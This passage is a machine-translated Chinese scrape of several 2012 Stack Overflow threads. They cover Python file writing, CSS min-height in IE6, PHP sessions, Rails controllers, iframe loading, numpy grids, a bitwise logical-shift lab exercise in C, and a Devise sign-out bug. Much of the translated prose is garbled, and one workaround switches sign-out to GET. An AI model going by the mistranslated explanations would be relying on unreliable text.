```

`.read()`读取整个文件并返回字符缓冲区，可用于调用`BeautifulSoup()`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-04T18:26:09.957

好的，经过一番搜索...

```
with open("test.html", "a") as myfile:
    myfile.write(content.encode('utf-8')) 
```

# internet-explorer - 最小高度在最小高度 css

> ID：13221348
> 
> 赞同：2
> 
> 时间：2012-11-04T18:06:18.117
> 
> 标签：internet-explorer, height, css

我试图拥有一个最小高度为 100% 的 div 和一个最小高度为 100% 的 div。

我不允许触摸标记，必须使用纯 css 完成。它也必须在 IE6+ 中工作，所以我不能使用 display:table。

我怎样才能做到这一点？

目前我有 html,body 设置为 height:100%, wrapper 设置为 min-height:100% 但是内部 div 需要外部 div 有一个高度设置才能有一个 % 设置本身...

这个问题的最佳解决方案是什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-04T18:13:58.167

如果你需要支持 IE6，min-height 是不可能的。

您可以在其他浏览器中使用 min-height 并添加条件语句来设置高度而不是 IE 中的 min-height。

IE8 及以上支持最小高度。

对于支持 min-height 的浏览器，您实际上不需要嵌套 min-height 声明。您只需要外部元素的最小高度，内部元素使用高度。

示例：http: [//jsfiddle.net/dmyN6/](http://jsfiddle.net/dmyN6/)

```
body, html {
    height: 100%;   
}

.a {
    min-height: 100%;   
    background-color: blue;
}

.b {
    height: 100%;
    background-color: aqua;    
} 
```

# php - php isset 不工作

> ID：13221352
> 
> 赞同：-2
> 
> 时间：2012-11-04T18:06:25.877
> 
> 标签：php, string

我想设置 $choice_1 和 $choice_2 但每个会话只设置一次。我正在使用 $choice_1 和 $choice_2 创建图像名称，并且我想避免在会话中绘制不同的 jpeg。[我在http://communitychessclub.com/rabren](http://communitychessclub.com/rabren)展示了两个棋子，我希望这两个图像用于整个用户会话。

```
<?php 
if (!isset($_SESSION['choice_1'])) {$chessmen = array("N","Q","R","B","K","P"); 

$random_piece = array_rand($chessmen); 
$choice_1 = $chessmen[$random_piece];
unset($chessmen[$random_piece]);

$random_piece = array_rand($chessmen); 
$choice_2 = $chessmen[$random_piece];} 
?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T18:32:28.510

在打印任何输出之前使用 session_start() 或在 php.ini 中将会话自动启动设置为 1

```
<?php
session_start();
if(!isset($_SESSION['test']))
echo "no test session";
else
echo $_SESSION['test'];
if($sth)
{
 $_SESSION['test'] = 'sth...';
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-04T19:12:22.573

试试这个方法...

```
<?php 
session_start();

if(!isset($_SESSION['choice_1'])) {
    $chessmen = array("N","Q","R","B","K","P"); 

    $random_piece = array_rand($chessmen); 
    $_SESSION['choice_1'] = $chessmen[$random_piece];

    unset($chessmen[$random_piece]);

    $random_piece = array_rand($chessmen); 
    $_SESSION['choice_2'] = $chessmen[$random_piece];
} 
?> 
```

您的会话数据存储在 $_SESSION-Array 内部，而不是作为通用 php 变量存储在外部。因此，如果您想稍后打印“choise_1”，则需要`echo $_SESSION['choise_1'];`.

# ruby-on-rails - 创建控制器和视图

> ID：13221357
> 
> 赞同：0
> 
> 时间：2012-11-04T18:06:59.873
> 
> 标签：ruby-on-rails, ruby-on-rails-3, ruby-on-rails-3.2

您好，我有以下型号。

用户模型：

```
class User < ActiveRecord::Base
  attr_accessible :email, :password, :password_confirmation
  has_one :user_informations
  has_secure_password
end 
```

用户信息模型：

```
class UserInformation < ActiveRecord::Base
  belongs_to :user
  attr_accessible :address, :address2, :business, :descripcion, :identification_number, :mobile_cell, :name, :phone_number
end 
```

现在我需要创建视图和控制器来创建和更新用户信息，我有很多问题：

1）如何生成控制器：

> rails g 控制器用户信息

○

> rails g 控制器用户信息

2）我的新建、创建和更新操作如何知道用户 ID。

3）如何设置此用户信息的路由

谢谢。也许这些是一个基本问题，但我是 Rails 新手，我不知道如何做所有这些。

再次感谢你的帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T18:52:28.650

You'll need a user_id column in your user_information table and model.

1) rails g UserController

2) you can include the user_id as param, so for the new action it will be

```
def new
  @user = User.find(param[:user_id])
  @user_information = @user.user_information.new
end 
```

the create and update actions would get the user id from the form params but you'll need to think about who is going to be using these actions and if you want to allow all users to update the information of other users. If not, you should have the user id as a hidden param and use a gem like cancan (https://github.com/ryanb/cancan) to restrict access

alternatively you can set them up as nested resources (http://railscasts.com/episodes/139-nested-resources)

3) for a simple resources you can add this to your routes.rb file

```
resource :user_information 
```

or for nested you can do

```
resource :users do
  member do
    resource :user_information
  end
end 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-04T18:46:37.800

1）您必须对控制器使用复数，所以`rails g controller UserInformations`可以。

2 + 3) 可以设置 Restful 路由：

```
resources :users do
  member do
    get 'user_information'
  end
end 
```

使用上述路线，您将拥有 path `users/:id/user_information`，因此您可以通过 了解您的用户 ID `params[:id]`，例如，在您可以使用的创建或更新操作中：

```
user = User.find(params[:id]) 
```

查找显示信息的用户。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-04T18:42:58.207

首先

在用户模型中，应该有

```
 has_one :user_information 
```

因为关联名称应该是单数的 has_one。

您可以通过给出命令来创建控制器

```
rails g controller UserInformation 
```

这取决于你想给你的控制器起什么名字。

在新操作中，您必须通过其 ID 查找用户。您可以在登录后将用户 ID 存储在会话中。或者，如果您是第一次保存用户，则必须传递用户 ID。

在新的行动中

```
user = User.find(session[:id])
user.user_information.create(params[:user_information]) 
```

我认为你需要先研究所有这些。通过一些例子。然后尝试。在这里问太快了。

# javascript - 我如何知道 iframe/popup 内容已加载/准备好？

> ID：13221358
> 
> 赞同：3
> 
> 时间：2012-11-04T18:07:05.037
> 
> 标签：javascript, jquery, html, dom

我有 2 个问题：

*   我怎么知道框架的内容准备好/加载（as `$(document.ready())`）？

*   我如何知道弹出 ( `window.open()`) 内容已准备好/已加载 (as `$(document.ready())`)？

谷歌说这可能会有所帮助`$("iframe").load()`，但我不明白如何

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-04T19:19:14.583

**[DEMO](http://jsfiddle.net/PpXKY/1/)** — `iframe`

The problem with using `load()` is the `iframe` may have already loaded before the jQuery has run, thus not triggering the function. One way around this would be to initially load nothing in the iframe (about:blank), then using jQuery to change the `src` attribute to get the `iframe` to point to the desired location.

**[DEMO](http://jsfiddle.net/3tssB/)** — `window.open`   (Disable your popup blocker for this demo.)

I'm not sure whether `ready()` can be used cross-domain. When loading a popup/`iframe` on the same domain, a script on the child page can be used to report back to the parent window that it is "ready".

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-04T18:14:43.880

The load callback will be called when the iFrame will be load :

```
$("#iframe-id").load(function(){
    //The iFrame content is loaded
}) 
```

# python - 将在方格上间隔的 (x,y,z) 元组列表转换为数组

> ID：13221368
> 
> 赞同：0
> 
> 时间：2012-11-04T18:08:14.653
> 
> 标签：python, numpy, matplotlib

我有一个元组列表，例如：

```
l=[ (2,2,1), (2,4,0), (2,8,0),
    (4,2,0), (4,4,1), (4,8,0),
    (8,2,0), (8,4,0), (8,8,1) ] 
```

并想将其转换为这样的numpy数组（矩阵中只有z值，对应x，y坐标的序列，坐标应单独存储）：

```
array([[ 1.,  0.,  0.],
       [ 0.,  1.,  0.],
       [ 0.,  0.,  1.]]) 
```

我在下面发布了我的解决方案，但它非常低级，我认为应该有一些更高级别的解决方案，或者使用 matplotlib 或 numpy。任何的想法？

需要这种转换来为 matplotlib 绘图函数（如`pcolor`、`imshow`、`contour`.

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-04T18:25:36.370

看起来带有该选项的[np.unique](http://docs.scipy.org/doc/numpy/reference/generated/numpy.unique.html#numpy-unique)`return_inverse`符合要求。例如，

```
In [203]: l[:,0]
Out[203]: array([2, 2, 2, 4, 4, 4, 8, 8, 8])

In [204]: np.unique(l[:,0], return_inverse = True)
Out[204]: (array([2, 4, 8]), array([0, 0, 0, 1, 1, 1, 2, 2, 2])) 
```

`np.unique`返回一个 2 元组。2 元组中的第一个数组是一个包含所有唯一值的数组`l[:,0]`。第二个数组是将值`array([2, 4, 8])`与原始数组中的值相关联的索引值`l[:,0]`。它也恰好是排名，因为`np.unique`按排序顺序返回唯一值。

* * *

```
import numpy as np
import matplotlib.pyplot as plt

l = np.array([ (2,2,1), (2,4,0), (2,8,0),
               (4,2,0), (4,4,1), (4,8,0),
               (8,2,0), (8,4,0), (8,8,1) ])

x, xrank = np.unique(l[:,0], return_inverse = True)
y, yrank = np.unique(l[:,1], return_inverse = True)

a = np.zeros((max(xrank)+1, max(yrank)+1))
a[xrank,yrank] = l[:,2]

fig = plt.figure()
ax = plt.subplot(111)

ax.pcolor(x, y, a)   
plt.show() 
```

产量

![在此处输入图像描述](../Images/9258b6544eab0481a41c324aaaaac51b.png)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-04T18:14:17.680

我的解决方案首先对 x 和 y 值进行排序，然后创建数组。

```
l=[ (2,2,1), (2,4,0), (2,8,0),
    (4,2,0), (4,4,1), (4,8,0),
    (8,2,0), (8,4,0), (8,8,1) ]

def rankdata_ignoretied(data):
   """ranks data counting all tied values as one"""
   # first translate the data values to integeres in increasing order
   counter=0
   encountered=dict()
   for e in sorted(data):
      if e not in encountered:
         encountered[e]=counter
         counter+=1   
   # then map the original sequence of the data values
   result=[encountered[e] for e in data]
   return result

x=[e[0] for e in l]
y=[e[1] for e in l]
z=[e[2] for e in l]

xrank=rankdata_ignoretied(x)
yrank=rankdata_ignoretied(y)

import numpy
a=numpy.zeros((max(xrank)+1, max(yrank)+1))
for i in range(len(l)):
   a[xrank[i],yrank[i]]=l[i][2] 
```

要使用生成的数组进行绘图，还需要原始 x 和 y 值，例如：

```
ax=plt.subplot(511)
ax.pcolor(sorted(set(x)), sorted(set(y)), a) 
```

任何人都对如何实现这一目标有更好的了解？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-04T18:26:35.757

我不明白你为什么要把这个弄得这么复杂。你可以简单地做到这一点：

```
array([
    [cell[2] for cell in row] for row in zip(*[iter(x)] * 3)
]) 
```

或者也许更易读：

```
array([
    [a[2], b[2], c[2]] for a, b, c in zip(x[0::3], x[1::3], x[2::3])
]) 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-04T18:34:59.783

使用标准 python 构造集、列表和排序的解决方案。如果您没有很多积分，即使比 unutbu 给出的 numpy 解决方案慢，它也会提高可读性

```
l=[ (2,2,1), (2,4,0), (2,8,0),
    (4,2,0), (4,4,1), (4,8,0),
    (8,2,0), (8,4,0), (8,8,1) ]

#get the ranks of the values for x and y
xi = sorted(list(set( i[0] for i in l )))
yi = sorted(list(set( i[1] for i in l )))
a = np.zeros((len(xi),len(yi)))
#fill the matrix using the list.index
for x,y,v in l:
    a[xi.index(x),yi.index(y)]=v

ax=plt.subplot(111)
ax.pcolor(array(xi), array(yi), a) 
```

# c++ - 有符号数据的逻辑右移

> ID：13221369
> 
> 赞同：11
> 
> 时间：2012-11-04T18:08:19.157
> 
> 标签：c++, c, x86, bit-manipulation, bit-shift

首先，不，这不是我的作业，这是一本名为[*Computer Systems A Programmer's Perspective*](https://www.pearson.com/uk/educators/higher-education-educators/program/Bryant-Computer-Systems-A-Programmer-s-Perspective-International-Edition-2nd-Edition/PGM918185.html)的书的实验室（顺便说一句，优秀的书）

我需要在不使用以下任何内容的情况下对有符号整数执行逻辑右移：

*   铸件
*   `if`, `while`, `switch`, `for`, `do`- `while`,`?` `:`
*   任何类型的指针

允许的运算符是： `!` `+` `~` `|` `>>` `<<` `^`

到目前为止我尝试了什么？

```
/* 
 * logicalShift - shift x to the right by n, using a logical shift
 *   Can assume that 0 <= n <= 31
 *   Examples: logicalShift(0x87654321,4) = 0x08765432
 *   Legal ops: ~ & ^ | + << >>
 *   Max ops: 20
 *   Rating: 3 
 */
int logicalShift(int x, int n) {
    int mask = ~0;
    int shiftAmount = 31 + ((~n)+1);//this evaluates to 31 - n on two's complement machines
    mask = mask << shiftAmount;
    mask = ~mask;//If n equals 0, it means we have negated all bits and hence have mask = 0
    x = x >> n;
    return x & mask; 
} 
```

只要`n`不等于就可以正常工作`0`，当它这样做时，此代码会中断，因为掩码将变为全 0，并且函数将返回`0`。

我将不胜感激任何正确方向的提示，而不是完整的代码。

同样，这不是功课；实验室作业可在此处公开获取[http://csapp.cs.cmu.edu/public/labs.html](http://csapp.cs.cmu.edu/public/labs.html)

PS：不是重复的，不要发布涉及转换为未签名然后转移的解决方案。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2019-08-22T11:58:48.303

## 这个问题是在 C++ 中搜索*逻辑移位*的第一个结果。

***因此，回答允许强制转换***的一般情况也是有意义的- 因为此处显示的代码均未使用正确（且快速）的操作码（仅一条`shr`指令而不是`sar`）。

# 演员表

此版本也适用于即将推出的`int128_t`（目前`__int128`在 GCC、Clang 和 ICC 中）和其他未来类型。如果您被允许使用`type_traits`并且您的代码应该在将来工作而不考虑正确的无符号类型，那么您应该将它用于正确的强制转换。

## 代码

```
#include <type_traits>

template<class T>
inline T logicalShift(T t1, T t2) {
  return 
    static_cast<
      typename std::make_unsigned<T>::type
    >(t1) >> t2;
} 
```

## 汇编代码分析

将其打包成`f(T x, T y) { return logicalShift(x, y); }`以下汇编程序指令（GCC9.2，-O3）的结果：

```
f(int, int):
        mov     eax, edi
        mov     ecx, esi
        shr     eax, cl
        ret
f(unsigned int, unsigned int):
        mov     eax, edi
        mov     ecx, esi
        shr     eax, cl
        ret
f(__int128, __int128):
        mov     rcx, rdx
        mov     rax, rdi
        mov     rdx, rsi
        shrd    rax, rsi, cl
        shr     rdx, cl
        xor     esi, esi
        and     ecx, 64
        cmovne  rax, rdx
        cmovne  rdx, rsi
        ret
f(unsigned __int128, unsigned __int128):
        mov     rcx, rdx
        mov     rax, rdi
        mov     rdx, rsi
        shrd    rax, rsi, cl
        shr     rdx, cl
        xor     esi, esi
        and     ecx, 64
        cmovne  rax, rdx
        cmovne  rdx, rsi
        ret 
```

结果`T a, b; T c = a >> b;`：

```
f(int, int):
        mov     eax, edi      # 32-bit registers
        mov     ecx, esi
        sar     eax, cl       # lower 8-bit of cx register
        ret
f(long, long):
        mov     rax, rdi      # 64-bit registers
        mov     ecx, esi
        sar     rax, cl
        ret
f(unsigned int, unsigned int):
        mov     eax, edi
        mov     ecx, esi
        shr     eax, cl
        ret
f(__int128, __int128):
        mov     rcx, rdx
        mov     rdx, rsi
        mov     rax, rdi
        sar     rdx, cl
        shrd    rax, rsi, cl
        mov     rsi, rdx
        sar     rsi, 63
        and     ecx, 64
        cmovne  rax, rdx
        cmovne  rdx, rsi
        ret 
```

我们看到，区别主要只是`shr`代替`sar`（对于__int128还有一些）。什么代码可以更快？

* * *

# 无演员版本

（将指令集简化为 ~ & ^ | + << >>）

## 问题 - 左移 ( `SAL`, `SHL`)

@Fingolfin 最初的想法很好。但是我们的处理器不会做我们首先想到的事情`int mask = ~0 << n`，`n >= 32;`但是为什么呢？

C++ 标准（草案 N4713, 8.5.7, 2nd）说 <<:

> 的值`E1 << E2`是`E1`左移的`E2`位位置；**空出的位是零填充的**。如果`E1`具有无符号类型，则结果的值为 ，以`E1 × 2^E2`比结果类型中可表示的最大值大一为模减少。否则，**如果`E1`具有带符号类型和非负值**，并且`E1 × 2^E2`可以在结果类型的相应无符号类型中表示，则转换为结果类型的该值就是结果值；**否则，行为是 undefined**。

听起来像`(E1 << E2) % (UINTxx_MAX + 1)`，我们只是从右边填充 0 并用模运算切断前导位。简单明了。

### 分析左移

16 位短、32 位整数和 64 位长的汇编代码（GCC 9.2，-O3）是：

```
g(short, short):
        movsx   eax, di    # 16-bit to 32-bit register
        mov     ecx, esi
        sal     eax, cl    # 1st is 32-bit, 2nd is 8-bit register
        ret
g(int, int):
        mov     eax, edi   # 32-bit registers
        mov     ecx, esi
        sal     eax, cl    # 1st is 32-bit, 2nd is 8-bit register
        ret
g(long, long):
        mov     rax, rdi   # 64-bit registers
        mov     ecx, esi
        sal     rax, cl    # 1st is 64-bit, 2nd is 8-bit register
        ret 
```

所以，我们讨论了我们从`~0 << i`for断言的`int i = 0; i <= 33; i++`内容，但我们真正得到了什么？

```
 0: 11111111111111111111111111111111
 1: 11111111111111111111111111111110
 2: 11111111111111111111111111111100
 3: 11111111111111111111111111111000
 4: 11111111111111111111111111110000
 5: 11111111111111111111111111100000
 6: 11111111111111111111111111000000
 7: 11111111111111111111111110000000
 8: 11111111111111111111111100000000
 9: 11111111111111111111111000000000
10: 11111111111111111111110000000000
11: 11111111111111111111100000000000
12: 11111111111111111111000000000000
13: 11111111111111111110000000000000
14: 11111111111111111100000000000000
15: 11111111111111111000000000000000
16: 11111111111111110000000000000000
17: 11111111111111100000000000000000
18: 11111111111111000000000000000000
19: 11111111111110000000000000000000
20: 11111111111100000000000000000000
21: 11111111111000000000000000000000
22: 11111111110000000000000000000000
23: 11111111100000000000000000000000
24: 11111111000000000000000000000000
25: 11111110000000000000000000000000
26: 11111100000000000000000000000000
27: 11111000000000000000000000000000
28: 11110000000000000000000000000000
29: 11100000000000000000000000000000
30: 11000000000000000000000000000000
31: 10000000000000000000000000000000
32: 11111111111111111111111111111111
33: 11111111111111111111111111111110 
```

我们看到，结果更像`~0 << (i%2^5)`.

所以，看一下 long（long aka.int64_t）案例：（用 MSVC for x86 编译）

```
 0: 1111111111111111111111111111111111111111111111111111111111111111
 1: 1111111111111111111111111111111111111111111111111111111111111110
 2: 1111111111111111111111111111111111111111111111111111111111111100
 3: 1111111111111111111111111111111111111111111111111111111111111000
 4: 1111111111111111111111111111111111111111111111111111111111110000
 5: 1111111111111111111111111111111111111111111111111111111111100000
 6: 1111111111111111111111111111111111111111111111111111111111000000
 7: 1111111111111111111111111111111111111111111111111111111110000000
 8: 1111111111111111111111111111111111111111111111111111111100000000
 9: 1111111111111111111111111111111111111111111111111111111000000000
10: 1111111111111111111111111111111111111111111111111111110000000000
11: 1111111111111111111111111111111111111111111111111111100000000000
12: 1111111111111111111111111111111111111111111111111111000000000000
13: 1111111111111111111111111111111111111111111111111110000000000000
14: 1111111111111111111111111111111111111111111111111100000000000000
15: 1111111111111111111111111111111111111111111111111000000000000000
16: 1111111111111111111111111111111111111111111111110000000000000000
17: 1111111111111111111111111111111111111111111111100000000000000000
18: 1111111111111111111111111111111111111111111111000000000000000000
19: 1111111111111111111111111111111111111111111110000000000000000000
20: 1111111111111111111111111111111111111111111100000000000000000000
21: 1111111111111111111111111111111111111111111000000000000000000000
22: 1111111111111111111111111111111111111111110000000000000000000000
23: 1111111111111111111111111111111111111111100000000000000000000000
24: 1111111111111111111111111111111111111111000000000000000000000000
25: 1111111111111111111111111111111111111110000000000000000000000000
26: 1111111111111111111111111111111111111100000000000000000000000000
27: 1111111111111111111111111111111111111000000000000000000000000000
28: 1111111111111111111111111111111111110000000000000000000000000000
29: 1111111111111111111111111111111111100000000000000000000000000000
30: 1111111111111111111111111111111111000000000000000000000000000000
31: 1111111111111111111111111111111110000000000000000000000000000000
32: 1111111111111111111111111111111100000000000000000000000000000000
33: 1111111111111111111111111111111000000000000000000000000000000000
34: 1111111111111111111111111111110000000000000000000000000000000000
35: 1111111111111111111111111111100000000000000000000000000000000000
36: 1111111111111111111111111111000000000000000000000000000000000000
37: 1111111111111111111111111110000000000000000000000000000000000000
38: 1111111111111111111111111100000000000000000000000000000000000000
39: 1111111111111111111111111000000000000000000000000000000000000000
40: 1111111111111111111111110000000000000000000000000000000000000000
41: 1111111111111111111111100000000000000000000000000000000000000000
42: 1111111111111111111111000000000000000000000000000000000000000000
43: 1111111111111111111110000000000000000000000000000000000000000000
44: 1111111111111111111100000000000000000000000000000000000000000000
45: 1111111111111111111000000000000000000000000000000000000000000000
46: 1111111111111111110000000000000000000000000000000000000000000000
47: 1111111111111111100000000000000000000000000000000000000000000000
48: 1111111111111111000000000000000000000000000000000000000000000000
49: 1111111111111110000000000000000000000000000000000000000000000000
50: 1111111111111100000000000000000000000000000000000000000000000000
51: 1111111111111000000000000000000000000000000000000000000000000000
52: 1111111111110000000000000000000000000000000000000000000000000000
53: 1111111111100000000000000000000000000000000000000000000000000000
54: 1111111111000000000000000000000000000000000000000000000000000000
55: 1111111110000000000000000000000000000000000000000000000000000000
56: 1111111100000000000000000000000000000000000000000000000000000000
57: 1111111000000000000000000000000000000000000000000000000000000000
58: 1111110000000000000000000000000000000000000000000000000000000000
59: 1111100000000000000000000000000000000000000000000000000000000000
60: 1111000000000000000000000000000000000000000000000000000000000000
61: 1110000000000000000000000000000000000000000000000000000000000000
62: 1100000000000000000000000000000000000000000000000000000000000000
63: 1000000000000000000000000000000000000000000000000000000000000000
64: 0000000000000000000000000000000000000000000000000000000000000000
65: 0000000000000000000000000000000000000000000000000000000000000000 
```

**繁荣！**

（直到 31 在 GCC 中也保持简短，因为它使用 32 位`EAX`寄存器`sal`）

但是，此结果仅由编译器创建：

**x86 msvc v19.22** , /O2:

```
_x$ = 8                                       ; size = 8
_y$ = 16                                                ; size = 8
__int64 g(__int64,__int64) PROC                                  ; g, COMDAT
        mov     eax, DWORD PTR _x$[esp-4]
        mov     edx, DWORD PTR _x$[esp]
        mov     ecx, DWORD PTR _y$[esp-4]
        jmp     __allshl
__int64 g(__int64,__int64) ENDP 
```

**x64 msvc v19.22** , /O2:

```
x$ = 8
y$ = 16
__int64 g(__int64,__int64) PROC                                  ; g, COMDAT
        mov     rax, rcx
        mov     rcx, rdx
        shl     rax, cl
        ret     0
__int64 g(__int64,__int64) ENDP 
```

并且 x64 MSVC 代码显示与 GCC 9.2 代码相同的行为 - 使用`shl`而不是`sal`.

从那时起，我们现在知道处理器本身（英特尔酷睿第六代）仅使用`cl`寄存器的最后一位，这取决于移位操作的第一个寄存器的长度，即使 C++ 标准另有规定。

## 一个小修复

所以，这就是代码中断的地方。本能地我会采取 shiftAmount of`32 - n`并进入上层问题，您已经通过使用 a `shiftAmount`of避免了这种情况`31 - n`。知道 n 是 0..31，没有 shiftAmount 32。很好。

但是，一方面减少意味着另一方面增加。现在`mask`需要从`-2`（我们不换档`0b1111`，我们换档`0b1110`）开始：

```
int logSh3(int x, int n) {
    int mask = ~2 + 1;
    int shiftAmount = 31 + ((~n) + 1);//this evaluates to 31 - n on two's complement machines
    mask = mask << shiftAmount;
    mask = ~mask;//If n equals 0, it means we have negated all bits and hence have mask = 0
    x = x >> n;
    return x & mask;
} 
```

它有效！

## 备用代码和分析

### 芬国昐密码（固定）

上层代码，作为汇编程序（GCC 9.2，-O3）：

```
logSh3(int, int):
        mov     ecx, 31
        mov     edx, -2
        mov     eax, edi
        sub     ecx, esi
        sal     edx, cl
        mov     ecx, esi
        not     edx
        sar     eax, cl
        and     eax, edx
        ret 
```

9 条指令

### 哈罗德密码

```
int logSh2(int x, int n) {
    int shiftAmount = 31 + ((~n) + 1);//this evaluates to 31 - n on two's complement machines
    int mask = 1 << shiftAmount;
    mask |= mask + ((~1) + 1);
    x = x >> n;
    return x & mask;
} 
```

```
logSh2(int, int):
        mov     ecx, esi
        mov     r8d, edi
        mov     edi, -2147483648
        shr     edi, cl
        sar     r8d, cl
        lea     eax, [rdi-1]
        or      eax, edi
        and     eax, r8d
        ret 
```

8条指令

我们能做得更好吗？

### 另一种解决方案

代替左移，我们可以对 进行右移`0b1000`，将其向后移一并反转。

```
int logSh4(int x, int n) {
    int mask = 0x80000000;
    mask = mask >> n;
    mask = mask << 1;
    mask = ~mask;//If n equals 0, it means we have negated all bits and hence have mask = 0
    x = x >> n;
    return x & mask;
} 
```

```
logSh4(int, int):
        mov     ecx, esi
        mov     edx, -2147483648
        sar     edx, cl
        sar     edi, cl
        lea     eax, [rdx+rdx]
        not     eax
        and     eax, edi
        ret 
```

7 指令

更好的方法？

让我们`0b0111`向右移动，向左移动一个并加 1。所以我们不用逆：

```
int logSh5(int x, int n) {
    int mask = 0x7fffffff;
    mask = mask >> n;
    mask = (mask << 1) | 1;
    x = x >> n;
    return x & mask;
} 
```

```
logSh5(int, int):
        mov     ecx, esi
        mov     eax, 2147483647
        sar     eax, cl
        sar     edi, cl
        lea     eax, [rax+1+rax]
        and     eax, edi
        ret 
```

还剩 6 条指令。美好的。（但简单的演员阵容仍然是实践中的最佳解决方案）

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2020-08-15T08:59:28.200

俗气的回答显然违反了问题的精神：强制转换¹不是在 C 或 C++ 中进行类型转换的唯一方法

```
return (x | 0U) >> n;    // assumes int and unsigned are the same width 
```

（[用于 x86-64 GCC 的 Godbolt](https://godbolt.org/z/vfxa1q)）。请注意，它还依赖于 withnegative 的实现定义的行为`n==0`，`x`因为这会留下符号位设置。但是在正常的 2 的补码实现中，无符号和 int 之间的转换只是保留了位模式以及正整数的值。使类型双关语显式`memcpy`而不是使用隐式类型转换可以使其更加健壮。

`|`运算符使用[通常的算术转换](http://eel.is/c++draft/expr.arith.conv#def:conversion,usual_arithmetic)规则使两个操作数具有相同的类型。我们可以使用它来*隐式地*转换为无符号的、围绕强制转换的人为限制的规则律师。

`0U`数字文字后缀不是强制转换，它只是无符号常量的简单语言语法。另一种选择是`x & UINT_MAX`或`x | (~UINT_MAX)`。或者更有趣的是，如果你知道的宽度小于`int`等于如果它更大，则为那些版本。`unsigned``0xffffffff``int``unsigned``long``long long`

当然，`unsigned tmp = x;`也不是演员表，所以真的只是那样做吧！但这更清楚地只是一个愚蠢的规则律师来寻找有问题的漏洞，而不是预期的目的。

* * *

**假设：**

*   这可能仅适用于 2 的补码，其中从有符号到无符号的转换不会修改对象表示的位模式。（相关：[如何在保留原始位模式的同时将（int）转换为（unsigned int）？](https://stackoverflow.com/questions/40440468/how-can-an-int-be-converted-to-unsigned-int-while-preserving-the-original-bi) -在将模归约应用于无符号之前，转换保留值，而不是位模式。）

*   `unsigned int`与 的宽度相同`int`，因此我们不会丢失任何位，并且不会符号扩展以`1`在逻辑右移之前引入高位。**

例如`(x | 0ULL) >> n`不起作用；这将在逻辑右移之前将*符号*扩展到 64 位（或其他），因此结果的低宽度将有效地将符号位的副本移入。（假设 2 的补码。）`x``int`

解决方法：使用无符号位域，其非填充位的确切数量为`int`. 有符号整数类型具有`numeric_limits<T>::digits`非符号位和 1 个符号位。（以及未知数量的填充）。这将需要分配，而不仅仅是与`|`.

```
struct uint { 
   unsigned long u : (1 + std::numeric_limits<int>::digits);
} 
```

如果你想`memcpy`进入这个结构而不是赋值（例如，确保位模式在右移之前不会改变，在非 2 的补码系统上？）你可以用`char pad[sizeof(int)];`. 这绝对是矫枉过正，比必要的填充更多，使其至少与`int`（或其他方向所需的`memcpy(&struct_tmp, &x, sizeof(x))`）一样大。我不确定结构是否保证至少与 a 一样宽，`unsigned long`因为我们使用它作为位域的基本类型，我也必须仔细检查标准的那部分。不过，GCC 和 MSVC 就是这种情况。`unsigned long long`使其 sizeof 达到 8\. IIRC，`unsigned long`保证至少与`int`.

如果我们想计算一个`char[]`数组所需的确切填充量，我们必须处理`sizeof(int) - sizeof(unsigned)`负数的可能性。*但是计算另一个填充位域*成员的额外位数可以工作，将填充计算为`CHAR_BIT * sizeof(int) - (1 + digits)`

在 C99 中，我们可以使用联合类型双关语来替换 memcpy，但我们可能仍然需要一个位域来确保我们将无符号值截断到正确的宽度。

* * *

**脚注 1**：ISO C++ [7.6.3 显式类型转换（强制转换表示法）[expr.cast]](http://eel.is/c++draft/expr.cast)说：

> 2：可以使用函数表示法、类型转换运算符（dynamic_cast、static_cast、reinterpret_cast、const_cast）或强制转换表示法来表示显式类型转换。
> 
> ```
>  cast-expression:
>         unary-expression
>         ( type-id ) cast-expression 
> ```

整个部分的名称是`[expr.cast]`，因此将这些用于类型转换的任何语法都视为强制转换是合理的，而不仅仅是“强制转换表达式”。幸运的是，没有必要试图证明`unsigned(x) >> n`不包括演员表是正当的。

# devise - 设计，无法退出

> ID：13221370
> 
> 赞同：6
> 
> 时间：2012-11-04T18:08:20.013
> 
> 标签：devise, activeadmin

在 Rails 应用程序中，我使用设计来管理我的用户，并且我的链接以破坏会话不再起作用。它工作正常，现在我添加了活动管理员，但没有。

我的链接是

```
<%= link_to "Déconnexion",  destroy_user_session_path, :method => :delete, :class => 'button'  %> 
```

我的路线.rb

```
devise_for :users, :controllers => { :omniauth_callbacks => "users/omniauth_callbacks"} 
```

我的耙子路线

```
destroy_user_session DELETE /users/sign_out(.:format) 
```

它尝试打开视图/users/sign_out，所以我有：

```
ActiveRecord::RecordNotFound in UsersController#show

Couldn't find User with id=sign_out 
```

Active_admin 和 Devise 会一起崩溃吗？这会很奇怪，因为主动使用设计，不是吗？

编辑：

对于下一个遇到此问题的人，我通过将下一行添加到 /config/initializers/devise.rb 来解决它。

```
config.sign_out_via = :get 
```

不完全是最好的方法，但它可以完成工作。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2016-04-26T10:33:30.190

发布 Jeff Paquette 的评论作为答案。

更新`config/initializers/active_admin.rb`：

```
config.logout_link_method = :delete 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-07-10T14:17:49.347

请在您的 routes.rb 中进行更改：-

```
devise_scope :users, :controllers => { :omniauth_callbacks => "users/omniauth_callbacks"} do
  get "/users/sign_out", :to => "devise/sessions#destroy"
end 
```

我也遇到了同样的问题，只有这可以在浪费 1 小时后解决我。

谢谢。

# sas - 使用 SAS Enterprise Miner 7.1 实施朴素贝叶斯

> ID：13221371
> 
> 赞同：-2
> 
> 时间：2012-11-04T18:08:31.340
> 
> 标签：sas, enterprise

我一直在尝试使用 SAS Enterprise Miner 7.1 实现朴素贝叶斯和 OneR 分类算法。

